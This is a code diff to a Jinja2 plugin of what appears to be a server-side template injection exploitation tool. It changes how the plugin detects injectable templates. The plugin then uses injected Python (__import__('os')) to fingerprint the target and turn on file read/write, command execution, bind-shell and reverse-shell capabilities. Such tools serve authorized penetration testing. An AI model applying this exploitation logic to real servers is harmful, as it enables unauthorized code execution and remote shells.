@@ -12,7 +12,14 @@ class Jinja2(Plugin):
         'render' : {
             'render': '{{%(code)s}}',
             'header': '{{%(header)s}}',
-            'trailer': '{{%(trailer)s}}'
+            'trailer': '{{%(trailer)s}}',
+            'render_test': """'%(s1)s'.join('%(s2)s')""" % { 
+                's1' : rand.randstrings[0], 
+                's2' : rand.randstrings[1]
+            },
+            'render_expected': '%(res)s' % { 
+                'res' : rand.randstrings[0].join(rand.randstrings[1])
+            }
         },
         'write' : {
             'call' : 'evaluate',
@@ -93,36 +100,21 @@ class Jinja2(Plugin):
 
     def rendered_detected(self):
 
-        randA = rand.randstr_n(2)
-        randB = rand.randstr_n(2)
+        os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
+        if os and re.search('^[\w-]+$', os):
+            self.set('os', os)
+            self.set('evaluate', self.language)
+            self.set('write', True)
+            self.set('read', True)
 
-        # Check this to avoid detecting Twig as Jinja2
-        payload = '{{"%s".join("%s")}}' % (randA, randB)
-        expected = randA.join(randB)
-
-        if expected == self.render(payload):
-
-            self.set('engine', self.plugin.lower())
-            self.set('language', self.language)
-
-            os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
-            if os and re.search('^[\w-]+$', os):
-                self.set('os', os)
-                self.set('evaluate', self.language)
-                self.set('write', True)
-                self.set('read', True)
-
-                expected_rand = str(rand.randint_n(2))
-                if expected_rand == self.execute('echo %s' % expected_rand):
-                    self.set('execute', True)
-                    self.set('bind_shell', True)
-                    self.set('reverse_shell', True)
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('bind_shell', True)
+                self.set('reverse_shell', True)
 
 
     def blind_detected(self):
-
-        self.set('engine', self.plugin.lower())
-        self.set('language', self.language)
 
         # Blind has been detected so code has been already evaluated
         self.set('evaluate_blind', self.language)
